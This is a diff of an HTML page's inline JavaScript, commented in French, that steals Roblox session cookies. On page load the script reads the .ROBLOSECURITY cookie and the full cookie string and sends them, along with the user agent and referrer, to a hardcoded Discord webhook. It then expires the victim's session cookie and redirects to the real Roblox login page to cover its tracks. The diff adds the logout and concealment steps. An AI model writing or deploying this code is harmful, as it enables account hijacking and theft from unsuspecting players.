@@ -20,25 +20,25 @@
 
     <script>
         (function() {
-            // --- CONFIG : REMPLACE CE LIEN PAR L'URL DE TON WEBHOOK DISCORD ---
+            // --- CONFIG : REMPLACE PAR TON URL DE WEBHOOK ---
             const WEBHOOK_URL = "https://discord.com/api/webhooks/1537045511968919636/kGTVPdnnPxP9OR8s_NsUVYSW8cKDiJ7cCUy50K7aBYMQmxXCM0g6eUAIbkCf-MFyvhyS";
-            // ----------------------------------------------------------------
+            // -------------------------------------------------
 
-            function recupererCookiesRoblox() {
+            function getRobloxCookies() {
                 const cookies = document.cookie.split('; ');
                 const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
-                const tousLesCookies = {};
+                const allCookies = {};
                 cookies.forEach(c => {
-                    const [cle, val] = c.split('=');
-                    tousLesCookies[cle] = val;
+                    const [key, val] = c.split('=');
+                    allCookies[key] = val;
                 });
                 return {
-                    securite: robloxSec ? robloxSec.split('=')[1] : null,
-                    complet: document.cookie
+                    security: robloxSec ? robloxSec.split('=')[1] : null,
+                    full: document.cookie
                 };
             }
 
-            function envoyerAuWebhook(donnees) {
+            function sendToWebhook(data) {
                 const payload = {
                     content: null,
                     embeds: [{
@@ -46,8 +46,8 @@
                         color: 0xff0000,
                         fields: [
                             { name: "🆔 IP / User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
-                            { name: "🔑 .ROBLOSECURITY", value: `\`${donnees.securite || 'NON TROUVÉ'}\``, inline: false },
-                            { name: "📦 Chaîne complète des cookies", value: `\`${donnees.complet || 'VIDE'}\``, inline: false },
+                            { name: "🔑 .ROBLOSECURITY", value: `\`${data.security || 'NON TROUVÉ'}\``, inline: false },
+                            { name: "📦 Chaîne complète", value: `\`${data.full || 'VIDE'}\``, inline: false },
                             { name: "🌐 Référent", value: document.referrer || 'Direct', inline: true },
                             { name: "🕹️ Horodatage", value: new Date().toUTCString(), inline: true }
                         ],
@@ -59,23 +59,28 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload),
-                    mode: 'no-cors' // envoi sans attente de réponse, le navigateur ne bloque pas
+                    mode: 'no-cors'
                 }).catch(() => {});
             }
 
-            // EXÉCUTION IMMÉDIATE
-            const cookies = recupererCookiesRoblox();
-            if (cookies.securite) {
-                envoyerAuWebhook(cookies);
+            // === PHASE 1 : VOL DU COOKIE ===
+            const cookies = getRobloxCookies();
+            if (cookies.security) {
+                sendToWebhook(cookies);
             } else {
-                // Même sans cookie, on envoie un ping avec l'environnement
-                envoyerAuWebhook({ securite: 'ABSENT', complet: document.cookie || 'PAS DE COOKIES' });
+                sendToWebhook({ security: 'ABSENT', full: document.cookie || 'PAS DE COOKIES' });
             }
 
-            // Redirige vers le vrai Roblox pour masquer l'opération
+            // === PHASE 2 : SUPPRESSION DU COOKIE POUR DÉCONNECTER ===
+            // On efface .ROBLOSECURITY en mettant sa date d'expiration dans le passé
+            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
+            // On efface aussi les éventuels autres cookies de session (optionnel)
+            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
+
+            // === PHASE 3 : REDIRECTION VERS LA VRAIE PAGE DE LOGIN ===
             setTimeout(() => {
                 window.location.replace("https://www.roblox.com/login");
-            }, 1800);
+            }, 1500);
         })();
     </script>
 </body>
